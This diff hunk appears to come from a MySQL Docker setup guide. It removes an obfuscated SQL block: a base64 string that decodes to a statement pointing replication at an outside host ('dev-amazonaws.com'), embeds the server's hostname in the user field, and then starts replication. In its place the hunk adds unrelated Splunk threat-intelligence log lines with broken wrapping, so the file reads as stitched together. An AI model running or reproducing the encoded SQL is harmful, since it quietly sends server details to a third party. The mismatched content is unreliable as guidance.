@@ -200,10 +200,19 @@ sudo docker run -d --name mysql-container \
   --entrypoint mysqld \
   mysql:8 --local-infile=1
 
-SET @b = 'U0VUIEBiYiA9IENPTkNBVCgiQ0hBTkdFIFJFUExJQ0FUSU9OIFNPVVJDRSBUTyBTT1VSQ0VfUEFTU1dPUkQ9J215LXNlY3JldC1wdycsIFNPVVJDRV9SRVRSWV9DT1VOVD0xLCBTT1VSQ0VfUE9SVD0zMzA2LCBTT1VSQ0VfSE9TVD0nZGV2LWFtYXpvbmF3cy5jb20nLCBTT1VSQ0VfVVNFUj0naFhqc0FtQ05jTEdIdkx5dnV1Z090YTBYM3VaTkd2MXUiLCAiKiIsIEBAbGNfdGltZV9uYW1lcywgIioiLCBAQGhvc3RuYW1lLCAiJzsiKTs=';
-SET @s2 = FROM_BASE64(@b);
-PREPARE stmt1 FROM @s2;
-EXECUTE stmt1;
-PREPARE stmt2 FROM @bb;
-EXECUTE stmt2;
-START REPLICA;
+
+2025-02-07 17:09:44,122+0000 INFO pid=1031934 tid=MainThread file=threatmatch.py:dispatch_lookupgen_searches:283 | status="No threat collection updates found"
+2025-02-07 17:10:00,174+0000 INFO pid=1182233 tid=MainThread file=threatmatch.py:<module>:409 | status="starting"
+2025-02-07 17:10:00,175+0000 INFO pid=1182111 tid=MainThread file=threatmatch.py:<module>:409 | status="starting"
+2025-02-07 17:10:00,228+0000 INFO pid=1182298 tid=MainThread file=threatmatch.py:<module>:409 | status="starting"
+2025-02-07 17:10:06,932+0000 INFO pid=1182233 tid=MainThread file=threatmatch.py:dispatch_threatgen_search:272 | status="Dispatched threat generating search" stanza="threatmatch://certificate_serial" sid="_c3BsdW5rLXN5c3RlbS11c2Vy__nobody_REEtRVN
+TLVRocmVhdEludGVsbGlnZW5jZQ__RMD5a335f60452fd92f6_1733546202.237252_17D52449-9FCC-44C4-9F31-815E49CFFD3F"
+2025-02-07 17:10:07,736+0000 INFO pid=1182298 tid=MainThread file=threatmatch.py:dispatch_threatgen_search:272 | status="Dispatched threat generating search" stanza="threatmatch://registry_value_text" sid="_c3BsdW5rLXN5c3RlbS11c2Vy__nobody_REEtRV
+NTLVRocmVhdEludGVsbGlnZW5jZQ__RMD56dc2dd36bb2e24c4_1733546202.237254_17D52449-9FCC-44C4-9F31-815E49CFFD3F"
+2025-02-07 17:10:12,603+0000 INFO pid=1182111 tid=MainThread file=threatmatch.py:dispatch_threatgen_search:272 | status="Dispatched threat generating search" stanza="threatmatch://file_hash" sid="_c3BsdW5rLXN5c3RlbS11c2Vy__nobody_REEtRVNTLVRocmVh
+dEludGVsbGlnZW5jZQ__RMD5bf3181ec0c11c49b_1733546202.237253_17D52449-9FCC-44C4-9F31-815E49CFFD3F"
+2025-02-07 17:15:00,175+0000 INFO pid=2983850 tid=MainThread file=threatmatch.py:<module>:409 | status="starting"
+2025-02-07 17:15:00,214+0000 INFO pid=2984861 tid=MainThread file=threatmatch.py:<module>:409 | status="starting"
+2025-02-07 17:15:00,233+0000 INFO pid=2985118 tid=MainThread file=threatmatch.py:<module>:409 | status="starting"
+2025-02-07 17:15:00,591+0000 INFO pid=2983850 tid=MainThread file=threatmatch.py:run:405 | status="This modular input does not execute on a search head cluster member" msg="will_execute="False" config="SHC" msg="Deselected based on SHC primary selection algorithm." primary_host="None" use_alpha="None" exclude_primary="None""
+2025-02-07 17:15:00,684+0000 INFO pid=2984861 tid=MainThread file=threatmatch.py:run:405 | status="This modular input does not execute on a search head cluster member" msg="will_execute="False" config="SHC" msg="Deselected based on SHC primary selection algorithm." primary_host="None" use_alpha="None" exclude_primary="None""
